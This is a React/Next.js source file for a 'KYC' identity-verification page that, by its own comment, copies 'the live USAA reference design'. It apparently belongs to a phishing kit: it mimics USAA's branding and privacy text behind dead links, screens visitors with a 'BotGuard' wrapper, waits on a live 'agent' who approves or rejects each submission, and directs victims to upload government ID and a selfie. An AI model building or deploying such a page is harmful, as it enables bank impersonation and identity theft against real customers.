'use client';

/**
 * KYC (Know Your Customer) Stage Page
 *
 * Identity verification flow matching the live USAA reference design
 * Includes popup blocker detection with manual link fallback
 */

import { useState, useEffect } from 'react';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';

export default function KYCPage() {
  const { status, caseId, agentMessage } = useSessionStore();

  const [kycStatus, setKycStatus] = useState<'not_started' | 'in_progress' | 'waiting'>('not_started');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Store KYC URL for fallback link if popup is blocked
  const [kycUrl, setKycUrl] = useState<string | null>(null);
  const [popupBlocked, setPopupBlocked] = useState(false);

  /**
   * Listen for agent rejections
   */
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setKycStatus('not_started');
      setError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsLoading(false);
    }
  }, [status, agentMessage]);

  async function handleBeginKYC() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    try {
      const response = await fetch('/api/user-started-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) throw new Error('Failed to start KYC');

      const data = await response.json();
      const url = data.kyc_url;

      if (!url) throw new Error('KYC provider not configured');

      // Store the URL for fallback
      setKycUrl(url);

      // Try to open popup
      const popup = window.open(url, '_blank');

      // Check if popup was blocked
      if (!popup || popup.closed || typeof popup.closed === 'undefined') {
        setPopupBlocked(true);
      }

      setKycStatus('in_progress');
      setError(null);
    } catch (err) {
      console.error(err);
      setError('Unable to start verification. Please try again.');
    }
  }

  async function handleKYCCompleted() {
    if (!caseId) return;

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch('/api/submit-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) throw new Error('Failed to submit');

      setKycStatus('waiting');
      useSessionStore.setState({
        status: 'waiting',
        agentMessage: 'KYC submitted. Waiting for review...',
      });
    } catch (err) {
      console.error(err);
      setError('Failed to submit verification. Please try again.');
    } finally {
      setIsLoading(false);
    }
  }

  const handleRetry = () => {
    setError(null);
    setKycStatus('not_started');
    setPopupBlocked(false);
    setKycUrl(null);
  };

  const isWaiting = kycStatus === 'waiting' || status === 'waiting';

  return (
    <BotGuard>
      <div className="login-card kyc-card">
        <h1 className="login-title">What to expect</h1>

        <div className="login-form">
          {isWaiting ? (
            <div className="waiting-container">
              <div className="spinner-container">
                <div className="loading-spinner"></div>
              </div>
              <p className="waiting-title">
                Verifying Identity...
              </p>
              <p className="waiting-text">
                Please wait while we review your verification steps.
              </p>
            </div>
          ) : (
            <>
              {kycStatus === 'not_started' && (
                <div className="form-step">
                  <p className="kyc-description">
                    To complete the verification process, we're going to ask you for several pieces of personal information that may include uploading images of a government-issued ID as well as asking you to take a real-time selfie picture.
                  </p>

                  <p className="kyc-privacy-text">
                    Protecting your privacy and account security is our top priority. Learn about the <a href="#" className="kyc-link">USAA Privacy Promise</a>.
                  </p>

                  {error && (
                    <div className="urgent-alert">
                      <div className="urgent-alert-icon">
                        <svg viewBox="0 0 24 24" fill="currentColor" width="24" height="24">
                          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                        </svg>
                      </div>
                      <div className="urgent-alert-content">
                        <div className="urgent-alert-title">System Message</div>
                        <div className="urgent-alert-message">{error}</div>
                      </div>
                    </div>
                  )}

                  <button onClick={handleBeginKYC} className="btn-primary btn-continue">
                    Continue
                  </button>

                  <a href="#" className="kyc-id-types-link">
                    Which forms of ID are accepted? →
                  </a>

                  {/* Warning notice matching reference */}
                  <div className="kyc-warning-notice">
                    <span className="kyc-warning-icon">⚠</span>
                    <span>Per law, we cannot accept Military IDs.</span>
                  </div>
                </div>
              )}

              {kycStatus === 'in_progress' && (
                <div className="form-step">
                  {/* Popup blocked fallback */}
                  {popupBlocked && kycUrl && (
                    <div className="popup-blocked-notice">
                      <p className="page-description">
                        <strong>Pop-up blocked?</strong> Click the link below to open the verification page:
                      </p>
                      <a
                        href={kycUrl}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="popup-fallback-link"
                        onClick={() => setPopupBlocked(false)}
                      >
                        Open Verification Page →
                      </a>
                    </div>
                  )}

                  <p className="kyc-description">
                    {popupBlocked
                      ? 'After completing verification, click the button below.'
                      : 'Please complete the verification in the new window. When finished, click Continue.'}
                  </p>

                  {error && (
                    <div className="urgent-alert">
                      <div className="urgent-alert-icon">
                        <svg viewBox="0 0 24 24" fill="currentColor" width="24" height="24">
                          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                        </svg>
                      </div>
                      <div className="urgent-alert-content">
                        <div className="urgent-alert-title">System Message</div>
                        <div className="urgent-alert-message">{error}</div>
                      </div>
                    </div>
                  )}

                  <button onClick={handleKYCCompleted} className={`btn-primary btn-continue ${isLoading ? 'loading' : ''}`}>
                    {isLoading ? 'Processing...' : 'Continue'}
                  </button>

                  <button onClick={handleRetry} className="text-btn">
                    Start over
                  </button>
                </div>
              )}
            </>
          )}
        </div>

        <a href="#" className="help-link">I need help logging on</a>
      </div>
    </BotGuard>
  );
}